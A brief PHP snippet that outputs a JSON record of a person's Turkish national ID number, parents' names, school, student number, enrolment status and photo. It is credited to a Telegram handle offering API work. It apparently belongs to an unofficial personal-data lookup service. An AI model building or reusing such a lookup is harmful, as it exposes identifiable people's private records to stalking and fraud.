$fayujx_rounded = "Tüm api & web site işleriniz için ulaşın; tg; @geceyesigara";

echo json_encode(array("status" => true, "fayuj_tc"=> $tccek, "fayuj_adi" => $adi, "fayuj_soyadi" => $soyadi, "fayuj_babaadi" => $babaadi, "fayuj_anneadi" => $anneadi, "fayuj_ogrencilikdurumu" => $ogrencilikdurumu, "fayuj_okul" => $okul, "fayuj_ogrencino" => $ogrencino, "fayuj_sonaktifdonemi" => $sonaktifdonemi,  "fayuj_author"=> $fayujx_rounded, "fayuj_resim"=> $resim), JSON_UNESCAPED_UNICODE);